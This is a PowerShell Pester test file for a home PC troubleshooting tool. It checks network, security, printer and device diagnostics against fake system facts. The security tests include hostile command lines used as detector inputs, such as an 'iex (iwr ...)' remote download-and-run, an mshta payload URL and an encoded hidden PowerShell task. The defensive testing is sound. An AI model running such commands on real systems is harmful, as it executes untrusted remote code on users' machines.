<#
    Run with the Pester that ships with Windows (3.4):

        powershell -ExecutionPolicy Bypass -Command "Invoke-Pester .\tests"
#>

$root = Split-Path -Parent $PSScriptRoot
. (Join-Path $root 'src\strings.ps1')
. (Join-Path $root 'src\ui.ps1')
. (Join-Path $root 'src\environment.ps1')
. (Join-Path $root 'src\menu.ps1')
. (Join-Path $root 'src\checks\common.ps1')
. (Join-Path $root 'src\checks\network.ps1')
. (Join-Path $root 'src\checks\email.ps1')
. (Join-Path $root 'src\checks\security.ps1')
. (Join-Path $root 'src\checks\devices.ps1')
. (Join-Path $root 'src\checks\audio-interop.ps1')
. (Join-Path $root 'src\checks\sound.ps1')
. (Join-Path $root 'src\checks\performance.ps1')
. (Join-Path $root 'src\checks\updates.ps1')
. (Join-Path $root 'src\checks\desktop.ps1')
. (Join-Path $root 'src\checks\overview.ps1')
. (Join-Path $root 'src\checks\win11.ps1')
. (Join-Path $root 'src\checks\comfort.ps1')
. (Join-Path $root 'src\checks\daily.ps1')
. (Join-Path $root 'src\checks\trouble.ps1')
. (Join-Path $root 'src\checks\android.ps1')
. (Join-Path $root 'src\fixes.ps1')
. (Join-Path $root 'src\note.ps1')
. (Join-Path $root 'src\relay.ps1')
. (Join-Path $root 'src\invoice.ps1')
. (Join-Path $root 'src\invoice-page.ps1')
. (Join-Path $root 'src\window.ps1')
. (Join-Path $root 'src\window-visit.ps1')
. (Join-Path $root 'src\window-pc.ps1')
. (Join-Path $root 'src\window-phone.ps1')
. (Join-Path $root 'src\window-start.ps1')
. (Join-Path $root 'src\window-ai.ps1')
. (Join-Path $root 'src\ai.ps1')

# Housecall's own source, put together the way dev.ps1 does it.
function Get-HcTestSource {
    $names = (Get-Content (Join-Path $root 'dev.ps1') | Where-Object { $_ -match "^\s+'([^']+\.ps1)'\s*$" }) -replace "^\s+'|'\s*$", ''
    ($names | ForEach-Object { [IO.File]::ReadAllText((Join-Path (Join-Path $root 'src') $_)) }) -join "`r`n"
}

# A clean PC on 26 Sep 2026; each scenario changes only what it is about.
function New-FakeSecurity {
    param([hashtable]$Change = @{})
    $f = [pscustomobject]@{
        Now = [datetime]'2026-09-26 10:00'; RemoteTools = @(); Tasks = @()
        Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $true; Outdated = $false; DaysOld = 0; Threats = 0 }
        Notifications = @(); Proxy = $null; Hosts = @()
    }
    foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
    $f
}
function New-FakeTool {
    param([string]$Name = 'AnyDesk', $InstallDate = $null, [bool]$Running = $false, $Downloaded = $null, $LastUsed = $null)
    [pscustomobject]@{
        Name = $Name; Installed = [bool]$InstallDate; InstallDate = $InstallDate; Running = $Running
        AutoStart = $false; Downloaded = $Downloaded; LastUsed = $LastUsed
    }
}

# A healthy Wi-Fi PC; each scenario changes only what it is about.
function New-FakeFacts {
    param([hashtable]$Change = @{})
    $wifi = [pscustomobject]@{ Name = 'Wi-Fi'; Status = 'Up'; IsWifi = $true; IfIndex = 5 }
    $f = [pscustomobject]@{
        Adapters = @($wifi); Active = $wifi; Ssid = 'Ziggo-5G'; Signal = 82
        IPv4 = '192.168.178.34'; Dhcp = $true; Gateway = '192.168.178.1'; DnsServers = @('192.168.178.1')
        Proxy = $null; GatewayMs = 3; InternetMs = 38; DnsOk = $true; Web = 'ok'
    }
    foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
    $f
}
function New-FakeAdapter {
    param([string]$Status, [bool]$IsWifi = $true)
    [pscustomobject]@{ Name = $(if ($IsWifi) { 'Wi-Fi' } else { 'Ethernet' }); Status = $Status; IsWifi = $IsWifi; IfIndex = 7 }
}

Describe 'Resolve-HcChoice' {
    $cases = @(
        @{ In = '';        Area = '';  Kind = 'empty';    Value = $null }
        @{ In = '   ';     Area = '';  Kind = 'empty';    Value = $null }
        @{ In = 'a';       Area = '';  Kind = 'area';     Value = 'A' }
        @{ In = 'F';       Area = 'A'; Kind = 'area';     Value = 'F' }
        @{ In = 'A1';      Area = '';  Kind = 'problem';  Value = 'A1' }
        @{ In = ' c1 ';    Area = '';  Kind = 'problem';  Value = 'C1' }
        @{ In = 'F2';      Area = 'A'; Kind = 'problem';  Value = 'F2' }
        @{ In = '1';       Area = 'A'; Kind = 'problem';  Value = 'A1' }
        @{ In = '4';       Area = 'D'; Kind = 'problem';  Value = 'D4' }
        @{ In = '9';       Area = 'B'; Kind = 'unknown';  Value = '9' }
        @{ In = '1';       Area = '';  Kind = 'unknown';  Value = '1' }
        @{ In = 'A9';      Area = '';  Kind = 'unknown';  Value = 'A9' }
        @{ In = 'Z';       Area = '';  Kind = 'unknown';  Value = 'Z' }
        @{ In = '?';       Area = '';  Kind = 'ai';       Value = $null }
        @{ In = '0';       Area = 'A'; Kind = 'back';     Value = $null }
        @{ In = 'l';       Area = '';  Kind = 'language'; Value = $null }
        @{ In = 'q';       Area = 'C'; Kind = 'quit';     Value = $null }
        @{ In = 'my printer is broken'; Area = ''; Kind = 'freetext'; Value = 'my printer is broken' }
        @{ In = 'printer broken';       Area = ''; Kind = 'unknown';  Value = 'printer broken' }
    )
    foreach ($c in $cases) {
        It "reads '$($c.In)' in area '$($c.Area)' as $($c.Kind)" {
            $r = Resolve-HcChoice $c.In -CurrentArea $c.Area
            $r.Kind | Should Be $c.Kind
            $r.Value | Should Be $c.Value
        }
    }

    It 'reads U as undo' {
        (Resolve-HcChoice 'u').Kind | Should Be 'undo'
    }

    It 'never uses a reserved key as an area letter' {
        foreach ($reserved in @('?', '0', 'L', 'Q', 'U', 'S', 'H')) {
            $script:Areas.Contains($reserved) | Should Be $false
        }
    }
}

Describe 'Strings' {
    It 'has the same keys in English and Dutch' {
        $en = @($script:Strings.en.Keys | Sort-Object)
        $nl = @($script:Strings.nl.Keys | Sort-Object)
        (Compare-Object $en $nl | Measure-Object).Count | Should Be 0
    }

    It 'has a name for every area and problem, and a check list for every area' {
        foreach ($lang in @('en', 'nl')) {
            foreach ($letter in $script:Areas.Keys) {
                $script:Strings[$lang]["area.$letter"] | Should Not BeNullOrEmpty
                $script:Strings[$lang]["looks.$letter"] | Should Not BeNullOrEmpty
                foreach ($code in $script:Areas[$letter]) {
                    $script:Strings[$lang]["problem.$code"] | Should Not BeNullOrEmpty
                }
            }
        }
    }

    It 'fills placeholders and falls back for a missing key' {
        $script:Lang = 'nl'
        T 'ai.youTyped' 'hallo' | Should Be 'U typte: hallo'
        T 'no.such.key' | Should Be '[no.such.key]'
        $script:Lang = 'en'
    }

    It 'starts in Dutch for a Dutch Windows or a PC in the Netherlands (Shamil''s PC)' {
        Get-HcDefaultLanguage 'nl-NL' 'BE' | Should Be 'nl'
        Get-HcDefaultLanguage 'en-NL' 'NL' | Should Be 'nl'
        Get-HcDefaultLanguage 'en-GB' 'GB' | Should Be 'en'
        Get-HcDefaultLanguage '' '' | Should Be 'en'
    }
}

Describe 'A1: Test-HcInternet' {
    $script:Lang = 'en'
    $cases = @(
        @{ Name = 'everything works';               Change = @{};                                    Finding = 'allGood' }
        @{ Name = 'no adapter at all';              Change = @{ Adapters = @(); Active = $null };    Finding = 'noAdapter' }
        @{ Name = 'Wi-Fi switched off';             Change = @{ Adapters = @(New-FakeAdapter 'Disabled'); Active = $null };          Finding = 'wifiDisabled' }
        @{ Name = 'Wi-Fi on, not connected';        Change = @{ Adapters = @(New-FakeAdapter 'Disconnected'); Active = $null };      Finding = 'wifiNotConnected' }
        @{ Name = 'cable unplugged';                Change = @{ Adapters = @(New-FakeAdapter 'Disconnected' $false); Active = $null }; Finding = 'cableUnplugged' }
        @{ Name = 'cable adapter switched off';     Change = @{ Adapters = @(New-FakeAdapter 'Disabled' $false); Active = $null };   Finding = 'adapterOff' }
        @{ Name = 'no address from the router';     Change = @{ IPv4 = '169.254.12.7'; GatewayMs = $null; InternetMs = $null; DnsOk = $null; Web = $null }; Finding = 'noAddress' }
        @{ Name = 'no address and a weak signal';   Change = @{ IPv4 = $null; Signal = 20; InternetMs = $null };                    Finding = 'noAddress' }
        @{ Name = 'no gateway';                     Change = @{ Gateway = $null; InternetMs = $null };                             Finding = 'noGateway' }
        @{ Name = 'router down';                    Change = @{ GatewayMs = -1; InternetMs = -1 };                                 Finding = 'gatewayDown' }
        @{ Name = 'router ignores pings';           Change = @{ GatewayMs = -1 };                                                  Finding = 'allGood' }
        @{ Name = 'router up, no internet';         Change = @{ InternetMs = -1; DnsOk = $null; Web = $null };                     Finding = 'internetDown' }
        @{ Name = 'DNS broken';                     Change = @{ DnsOk = $false; Web = $null };                                     Finding = 'dnsDown' }
        @{ Name = 'login page catches the web';     Change = @{ Web = 'intercepted' };                                             Finding = 'webIntercepted' }
        @{ Name = 'proxy catches the web';          Change = @{ Web = 'failed'; Proxy = '127.0.0.1:8080' };                        Finding = 'proxy' }
        @{ Name = 'proxy set, web works';           Change = @{ Proxy = 'http://evil.example/proxy.pac' };                         Finding = 'proxy' }
        @{ Name = 'weak Wi-Fi';                     Change = @{ Signal = 25 };                                                      Finding = 'weakSignal' }
        @{ Name = 'on a cable';                     Change = @{ Active = (New-FakeAdapter 'Up' $false); Adapters = @(New-FakeAdapter 'Up' $false); Ssid = $null; Signal = $null }; Finding = 'allGood' }
    )
    foreach ($c in $cases) {
        It "finds '$($c.Finding)' when: $($c.Name)" {
            $r = Test-HcInternet (New-FakeFacts $c.Change)
            $r.FindingId | Should Be $c.Finding
        }
    }

    It 'shows no problem lines when everything works' {
        $r = Test-HcInternet (New-FakeFacts)
        @($r.Results | Where-Object { $_.Status -ne 'ok' }).Count | Should Be 0
    }

    It 'skips what follows the broken link' {
        $r = Test-HcInternet (New-FakeFacts @{ InternetMs = -1; DnsOk = $null; Web = $null })
        $r.Results[-1].Status | Should Be 'skipped'
        @($r.Results | Where-Object { $_.Text -match 'DNS' }).Count | Should Be 0
    }

    It 'never shows a missing-string marker' {
        foreach ($c in $cases) {
            foreach ($lang in @('en', 'nl')) {
                $script:Lang = $lang
                $r = Test-HcInternet (New-FakeFacts $c.Change)
                @($r.Results | Where-Object { $_.Text -match '^\[' }).Count | Should Be 0
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'A2: Test-HcConnectionQuality' {
    $good = [pscustomobject]@{ Sent = 10; Lost = 0; AverageMs = 4 }

    It 'calls a healthy connection healthy' {
        (Test-HcConnectionQuality (New-FakeFacts) $good 3).FindingId | Should Be 'connHealthy'
    }
    It 'reports lost messages as unstable, with the percentage' {
        $r = Test-HcConnectionQuality (New-FakeFacts) ([pscustomobject]@{ Sent = 10; Lost = 3; AverageMs = 9 }) 3
        $r.FindingId | Should Be 'unstable'
        $r.FindingArgs[0] | Should Be 30
    }
    It 'reports many Wi-Fi drop-outs' {
        (Test-HcConnectionQuality (New-FakeFacts) $good 64).FindingId | Should Be 'dropsMany'
    }
    It 'puts a weak signal first' {
        (Test-HcConnectionQuality (New-FakeFacts @{ Signal = 30 }) ([pscustomobject]@{ Sent = 10; Lost = 5; AverageMs = 9 }) 3).FindingId | Should Be 'weakSignal'
    }
    It 'stops at the A1 answer when the internet is down' {
        (Test-HcConnectionQuality (New-FakeFacts @{ InternetMs = -1 }) $null $null).FindingId | Should Be 'internetDown'
    }
    It 'ignores drop-outs on a cable' {
        $cable = New-FakeAdapter 'Up' $false
        (Test-HcConnectionQuality (New-FakeFacts @{ Active = $cable; Adapters = @($cable) }) $good 99).FindingId | Should Be 'connHealthy'
    }
}

Describe 'A3: one website' {
    $names = @(
        @{ In = 'marktplaats.nl';                    Out = 'marktplaats.nl' }
        @{ In = ' https://www.Marktplaats.nl/a?b=1 '; Out = 'www.marktplaats.nl' }
        @{ In = 'http://mail.google.com:443/x';      Out = 'mail.google.com' }
        @{ In = 'whatsapp';                          Out = $null }
        @{ In = 'mijn bank';                         Out = $null }
    )
    foreach ($n in $names) {
        It "reads '$($n.In)' as '$($n.Out)'" { ConvertTo-HcHostName $n.In | Should Be $n.Out }
    }

    It 'finds a hosts-file line for the site or its www. twin, and ignores comments' {
        $hosts = Join-Path $TestDrive 'hosts'
        Set-Content $hosts @('# 127.0.0.1 bank.nl', '127.0.0.1 localhost', '', '0.0.0.0   www.marktplaats.nl   other.nl')
        Get-HcHostsEntry 'marktplaats.nl' $hosts | Should Be '0.0.0.0'
        Get-HcHostsEntry 'bank.nl' $hosts | Should Be $null
        Get-HcHostsEntry 'nu.nl' (Join-Path $TestDrive 'missing') | Should Be $null
    }

    $site = { param($c) $s = [pscustomobject]@{ Host = 'bank.nl'; HostsEntry = $null; Address = '1.2.3.4'; TcpMs = 12; HttpStatus = 200 }; foreach ($k in $c.Keys) { $s.$k = $c[$k] }; $s }
    $siteCases = @(
        @{ Name = 'site works';               Change = @{};                                         Finding = 'siteOk' }
        @{ Name = 'bot protection (403)';     Change = @{ HttpStatus = 403 };                      Finding = 'siteOk' }
        @{ Name = 'hosts file redirect';      Change = @{ HostsEntry = '0.0.0.0'; Address = '0.0.0.0'; TcpMs = -1 }; Finding = 'siteHosts' }
        @{ Name = 'name not found';           Change = @{ Address = $null; TcpMs = $null; HttpStatus = $null }; Finding = 'siteNotFound' }
        @{ Name = 'no answer on 443';         Change = @{ TcpMs = -1; HttpStatus = $null };        Finding = 'siteBlocked' }
        @{ Name = 'server error';             Change = @{ HttpStatus = 503 };                      Finding = 'siteError' }
        @{ Name = 'connects, sends nothing';  Change = @{ HttpStatus = 0 };                        Finding = 'siteBlocked' }
    )
    foreach ($c in $siteCases) {
        It "finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcSite (& $site $c.Change)).FindingId | Should Be $c.Finding
        }
    }
}

Describe 'F: Test-HcSecurity' {
    $script:Lang = 'en'
    $all = $script:SecurityChecks['F3'].Parts
    $cases = @(
        @{ Name = 'a clean PC';                          Change = @{};                                                                 Finding = 'cleanAll' }
        @{ Name = 'AnyDesk running right now';           Change = @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2024-01-01') -Running $true) }; Finding = 'remoteActive' }
        @{ Name = 'AnyDesk installed two days ago';      Change = @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) };  Finding = 'remoteRecent' }
        @{ Name = 'AnyDesk downloaded, never installed'; Change = @{ RemoteTools = @(New-FakeTool -Downloaded ([datetime]'2026-09-20')) };   Finding = 'remoteRecent' }
        @{ Name = 'AnyDesk removed, but used last week'; Change = @{ RemoteTools = @(New-FakeTool -LastUsed ([datetime]'2026-09-19')) };     Finding = 'remoteRecent' }
        @{ Name = 'TeamViewer installed years ago';      Change = @{ RemoteTools = @(New-FakeTool 'TeamViewer' ([datetime]'2021-03-02')) };  Finding = 'remoteOld' }
        @{ Name = 'virus protection off';                Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $false; Outdated = $false; DaysOld = 0; Threats = 0 } }; Finding = 'defenderOff' }
        @{ Name = 'virus protection out of date';        Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Norton'; Enabled = $true; Outdated = $true; DaysOld = $null; Threats = $null } }; Finding = 'avOld' }
        @{ Name = 'threats stopped recently';            Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $true; Outdated = $false; DaysOld = 0; Threats = 2 } }; Finding = 'threatsFound' }
        @{ Name = 'an encoded scheduled task';           Change = @{ Tasks = @([pscustomobject]@{ Name = 'Updater'; Command = 'powershell -enc SQBFAFgA'; Level = 'strong' }) }; Finding = 'suspiciousTask' }
        @{ Name = 'a hidden script task';                Change = @{ Tasks = @([pscustomobject]@{ Name = 'CourierAgent'; Command = 'wscript.exe x.vbs'; Level = 'weak' }) };     Finding = 'unknownTask' }
        @{ Name = 'sites may send notifications';        Change = @{ Notifications = @([pscustomobject]@{ Browser = 'Chrome'; Site = 'https://virus-alert.example'; Since = [datetime]'2026-09-21' }) }; Finding = 'notifySites' }
        @{ Name = 'a proxy';                             Change = @{ Proxy = '127.0.0.1:8888' };                                       Finding = 'proxy' }
        @{ Name = 'hosts redirects';                     Change = @{ Hosts = @('www.ing.nl -> 10.0.0.9') };                            Finding = 'hostsRedirect' }
        @{ Name = 'running tool beats everything else';  Change = @{ RemoteTools = @(New-FakeTool -Running $true); Proxy = 'x'; Antivirus = [pscustomobject]@{ Known = $true; Name = 'D'; Enabled = $false; Outdated = $false; DaysOld = 0; Threats = 0 } }; Finding = 'remoteActive' }
    )
    foreach ($c in $cases) {
        It "finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcSecurity (New-FakeSecurity $c.Change) $all 'cleanAll').FindingId | Should Be $c.Finding
        }
    }

    It 'dates a recent tool in the finding' {
        $r = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) }) @('remote') 'cleanCall'
        $r.FindingArgs[0] | Should Be 'AnyDesk'
        $r.FindingArgs[1] | Should Be '24 Sep 2026'
    }

    It 'marks a running or recent tool as a problem, an old one as check-this' {
        $recent = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) }) @('remote') 'cleanCall'
        $old = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2021-01-01')) }) @('remote') 'cleanCall'
        $recent.Results[0].Status | Should Be 'problem'
        $old.Results[0].Status | Should Be 'warn'
    }

    It 'lets well-known notification sites pass and flags only the rest' {
        $site = { param($s) [pscustomobject]@{ Browser = 'Brave'; Site = $s; Since = [datetime]'2026-09-20' } }
        $onlyKnown = @((& $site 'https://mail.google.com'), (& $site 'https://web.whatsapp.com'), (& $site 'http://localhost:5173'))
        (Test-HcSecurity (New-FakeSecurity @{ Notifications = $onlyKnown }) @('notifications') 'cleanPopup').FindingId | Should Be 'cleanPopup'

        $mixed = $onlyKnown + @((& $site 'https://mail.google.com.virus-alert.example'), (& $site 'https://robot-check.example'))
        $r = Test-HcSecurity (New-FakeSecurity @{ Notifications = $mixed }) @('notifications') 'cleanPopup'
        $r.FindingId | Should Be 'notifySites'
        $r.FindingArgs[0] | Should Be 2
    }

    It 'does not treat a look-alike domain as known' {
        Test-HcKnownSite 'https://calendar.google.com' | Should Be $true
        Test-HcKnownSite 'https://www.facebook.com' | Should Be $true
        Test-HcKnownSite 'https://mail.google.com.virus-alert.example' | Should Be $false
        Test-HcKnownSite 'https://notmarktplaats.nl' | Should Be $false
    }

    It 'uses each problem''s own clean finding' {
        (Test-HcSecurity (New-FakeSecurity) $script:SecurityChecks['F1'].Parts 'cleanPopup').FindingId | Should Be 'cleanPopup'
        (Test-HcSecurity (New-FakeSecurity) $script:SecurityChecks['F2'].Parts 'cleanCall').FindingId | Should Be 'cleanCall'
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            foreach ($c in $cases) {
                $r = Test-HcSecurity (New-FakeSecurity $c.Change) $all 'cleanAll'
                @($r.Results | Where-Object { $_.Text -match '\[\w+\.\w+\]' }).Count | Should Be 0
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'F: reading the PC' {
    $tasks = @(
        @{ Exe = 'powershell.exe';  Args = '-NoP -W Hidden -enc SQBFAFgA';                      Level = 'strong' }
        @{ Exe = 'powershell.exe';  Args = '-c "iex (iwr http://x.example/a.ps1)"';            Level = 'strong' }
        @{ Exe = 'mshta.exe';       Args = 'https://x.example/run.hta';                         Level = 'strong' }
        @{ Exe = 'C:\Users\Public\svc.exe'; Args = '';                                          Level = 'strong' }
        @{ Exe = 'wscript.exe';     Args = '"C:\Users\shami\AppData\Local\Reveille\start-agent-hidden.vbs"'; Level = 'weak' }
        @{ Exe = 'C:\Users\shami\AppData\Local\Programs\Opera GX\autoupdate\opera_autoupdate.exe'; Args = '--scheduledtask'; Level = $null }
        @{ Exe = 'shutdown.exe';    Args = '/r /fw /t 5';                                       Level = $null }
    )
    foreach ($t in $tasks) {
        It "rates '$($t.Exe) $($t.Args)' as $(if ($t.Level) { $t.Level } else { 'fine' })" {
            Get-HcTaskLevel $t.Exe $t.Args | Should Be $t.Level
        }
    }

    It 'reads install dates from the registry format' {
        ConvertFrom-HcInstallDate '20260924' | Should Be ([datetime]'2026-09-24')
        ConvertFrom-HcInstallDate '' | Should Be $null
        ConvertFrom-HcInstallDate '24-09-2026' | Should Be $null
    }

    It 'lists hosts-file redirects but not localhost' {
        $hosts = Join-Path $TestDrive 'hosts-f'
        Set-Content $hosts @('# comment', '127.0.0.1 localhost', '::1 localhost', '10.0.0.9 www.ing.nl ing.nl')
        @(Get-HcHostsRedirects $hosts) | Should Be @('www.ing.nl -> 10.0.0.9', 'ing.nl -> 10.0.0.9')
    }

    It 'has no remote tool pattern that matches everyday programs' {
        $everyday = @('Google Chrome', 'Microsoft Edge', 'Mozilla Firefox', 'VLC media player', 'Microsoft 365', 'LogMeIn Hamachi', 'Zoom Workplace', 'WhatsApp', 'Opera GX', 'Steam')
        foreach ($tool in $script:RemoteToolList | Where-Object { $_.Pattern }) {
            foreach ($name in $everyday) { $name -match $tool.Pattern | Should Be $false }
        }
    }
}

Describe 'C: printer and devices' {
    $script:Lang = 'en'
    $printer = { param($name, [hashtable]$c = @{})
        $p = [pscustomobject]@{ Name = $name; Default = $false; Virtual = $false; Offline = $false; State = 0; HostAddress = $null; Reachable = $null }
        foreach ($k in $c.Keys) { $p.$k = $c[$k] }
        $p }
    $pdf = & $printer 'Microsoft Print to PDF' @{ Virtual = $true }
    $hp = & $printer 'HP DeskJet 2700' @{ Default = $true }
    $facts = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Now = [datetime]'2026-09-26 10:00'; SpoolerRunning = $true; SpoolerDisabled = $false; Printers = @($pdf, $hp); Jobs = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }

    $cases = @(
        @{ Name = 'a ready default printer';          Change = @{};                                                                   Finding = 'printerReady' }
        @{ Name = 'the print service stopped';        Change = @{ SpoolerRunning = $false; Printers = @() };                           Finding = 'spoolerStopped' }
        @{ Name = 'only Print to PDF';                Change = @{ Printers = @($pdf) };                                              Finding = 'noPrinter' }
        @{ Name = 'Print to PDF is the default';      Change = @{ Printers = @((& $printer 'Microsoft Print to PDF' @{ Virtual = $true; Default = $true }), (& $printer 'HP DeskJet 2700')) }; Finding = 'defaultVirtual' }
        @{ Name = 'no default printer at all';        Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700')) };               Finding = 'noDefault' }
        @{ Name = 'the printer is offline';           Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; Offline = $true })) }; Finding = 'printerOffline' }
        @{ Name = 'a network printer not answering';  Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; HostAddress = '192.168.1.40'; Reachable = $false })) }; Finding = 'printerUnreachable' }
        @{ Name = 'out of paper';                     Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; State = 4 })) }; Finding = 'printerAttention' }
        @{ Name = 'low on ink only';                  Change = @{ Printers = @($pdf, (& $printer 'HP DeskJet 2700' @{ Default = $true; State = 5 })) }; Finding = 'printerReady' }
        @{ Name = 'documents stuck for an hour';      Change = @{ Jobs = @([pscustomobject]@{ Printer = 'HP DeskJet 2700'; Document = 'Brief.docx'; Submitted = [datetime]'2026-09-26 09:00'; Status = '' }) }; Finding = 'jobsStuck' }
        @{ Name = 'a document sent a minute ago';     Change = @{ Jobs = @([pscustomobject]@{ Printer = 'HP DeskJet 2700'; Document = 'Brief.docx'; Submitted = [datetime]'2026-09-26 09:59'; Status = '' }) }; Finding = 'printerReady' }
    )
    foreach ($c in $cases) {
        It "C1 finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcPrinter (& $facts $c.Change)).FindingId | Should Be $c.Finding
        }
    }

    It 'C1 offers the right fixes' {
        @((Test-HcPrinter (& $facts @{ SpoolerRunning = $false; Printers = @() })).Actions)[0].FixId | Should Be 'startSpooler'
        $r = Test-HcPrinter (& $facts @{ Printers = @((& $printer 'Microsoft Print to PDF' @{ Virtual = $true; Default = $true }), (& $printer 'HP DeskJet 2700')) })
        $r.Actions[0].FixId | Should Be 'setDefault'
        $r.Actions[0].Target.Name | Should Be 'HP DeskJet 2700'
        $r.Actions[0].Target.Previous | Should Be 'Microsoft Print to PDF'
        $stuck = Test-HcPrinter (& $facts @{ Jobs = @([pscustomobject]@{ Printer = 'x'; Document = 'd'; Submitted = [datetime]'2026-09-26 08:00'; Status = '' }) })
        @($stuck.Actions | ForEach-Object { $_.FixId }) | Should Be @('clearJobs', 'restartSpooler')
        @((Test-HcPrinter (& $facts)).Actions)[0].FixId | Should Be 'printTestPage'
    }

    $inputFacts = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ Problems = @(); Keyboards = 1; Pointers = 1; UsbDrives = @() }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    $device = { param($code) [pscustomobject]@{ Name = 'USB Receiver'; Class = 'HIDClass'; Code = $code; InstanceId = 'USB\VID_046D&PID_C52B\5&1' } }
    $inputCases = @(
        @{ Name = 'everything works';         Change = @{};                                                          Finding = 'devicesOk' }
        @{ Name = 'a device switched off';    Change = @{ Problems = @(& $device 22) };                             Finding = 'deviceDisabled' }
        @{ Name = 'a device without driver';  Change = @{ Problems = @(& $device 28) };                             Finding = 'deviceNoDriver' }
        @{ Name = 'a device reporting 43';    Change = @{ Problems = @(& $device 43) };                             Finding = 'deviceError' }
        @{ Name = 'no mouse';                 Change = @{ Pointers = 0 };                                            Finding = 'noPointer' }
        @{ Name = 'a USB stick, no letter';   Change = @{ UsbDrives = @([pscustomobject]@{ Name = 'SanDisk Cruzer'; Letters = @() }) }; Finding = 'usbNoLetter' }
        @{ Name = 'a USB stick as E:';        Change = @{ UsbDrives = @([pscustomobject]@{ Name = 'SanDisk Cruzer'; Letters = @('E:') }) }; Finding = 'devicesOk' }
    )
    foreach ($c in $inputCases) {
        It "C2 finds '$($c.Finding)' when: $($c.Name)" {
            (Test-HcInputDevices (& $inputFacts $c.Change)).FindingId | Should Be $c.Finding
        }
    }

    It 'C2 offers to switch a device back on, or restart it, by its instance id' {
        $off = Test-HcInputDevices (& $inputFacts @{ Problems = @(& $device 22) })
        $off.Actions[0].FixId | Should Be 'enableDevice'
        $off.Actions[0].Target.InstanceId | Should Be 'USB\VID_046D&PID_C52B\5&1'
        (Test-HcInputDevices (& $inputFacts @{ Problems = @(& $device 43) })).Actions[0].FixId | Should Be 'restartDevice'
        @((Test-HcInputDevices (& $inputFacts @{ Problems = @(& $device 28) })).Actions).Count | Should Be 0
    }

    $bt = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{
            Adapters = @([pscustomobject]@{ Name = 'TP-Link Bluetooth USB Adapter'; Code = 0; InstanceId = 'USB\VID_2357&PID_0604\1' })
            ServiceRunning = $true
            Paired = @([pscustomobject]@{ Name = 'JBL Charge Essential'; Connected = $false })
        }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }
    It 'C3 finds a working adapter, a missing one, a stopped service and a switched-off adapter' {
        (Test-HcBluetooth (& $bt)).FindingId | Should Be 'btOk'
        (Test-HcBluetooth (& $bt @{ Adapters = @() })).FindingId | Should Be 'btNoAdapter'
        $stopped = Test-HcBluetooth (& $bt @{ ServiceRunning = $false })
        $stopped.FindingId | Should Be 'btServiceStopped'
        $stopped.Actions[0].FixId | Should Be 'startBtService'
        $off = Test-HcBluetooth (& $bt @{ Adapters = @([pscustomobject]@{ Name = 'TP-Link Bluetooth USB Adapter'; Code = 22; InstanceId = 'USB\x' }) })
        $off.FindingId | Should Be 'deviceDisabled'
        $off.FindingArgs[0] | Should Be 'TP-Link Bluetooth USB Adapter'
    }

    It 'C3 lists paired devices with their connection state' {
        $r = Test-HcBluetooth (& $bt @{ Paired = @([pscustomobject]@{ Name = 'JBL Charge Essential'; Connected = $false }, [pscustomobject]@{ Name = 'Pro Controller'; Connected = $true }) })
        ($r.Results | Where-Object { $_.Text -like 'Paired:*' }).Text | Should Be 'Paired: JBL Charge Essential (not connected), Pro Controller (connected)'
    }

    It 'never shows a missing-string marker, in either language' {
        foreach ($lang in @('en', 'nl')) {
            $script:Lang = $lang
            $reports = @($cases | ForEach-Object { Test-HcPrinter (& $facts $_.Change) }) +
                       @($inputCases | ForEach-Object { Test-HcInputDevices (& $inputFacts $_.Change) }) +
                       @((Test-HcBluetooth (& $bt)), (Test-HcBluetooth (& $bt @{ ServiceRunning = $false })))
            foreach ($r in $reports) {
                @($r.Results | Where-Object { $_.Text -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
                @($r.Actions | ForEach-Object { Get-HcFixLabel $_ } | Where-Object { $_ -match '\[\w+(\.\w+)+\]' }).Count | Should Be 0
            }
        }
        $script:Lang = 'en'
    }
}

Describe 'B: sound, video calls and screen' {
    $script:Lang = 'en'
    $out = { param($name, $default = $false, $muted = $false, $volume = 40)
        [pscustomobject]@{ Id = "id-$name"; Name = $name; IsDefault = $default; Muted = $muted; Volume = $volume } }
    $sound = { param([hashtable]$c = @{})
        $f = [pscustomobject]@{ ServiceRunning = $true; Problems = @()
            Outputs = @((& $out 'Speakers (Realtek(R) Audio)' $true), (& $out '2 - VG27AQML1A (AMD High Definition Audio Device)'), (& $out 'Headphones (Elgato Wave:3)')) }
        foreach ($k in $c.Keys) { $f.$k = $c[$k] }
        $f }

    $soundCases = @(
        @{ Name = 'sound works';                   Change = @{};                                                         Finding = 'soundOk' }
        @{ Name = 'the sound service stopped';     Change = @{ ServiceRunning = $false };                               Finding = 'audioServiceStopped' }
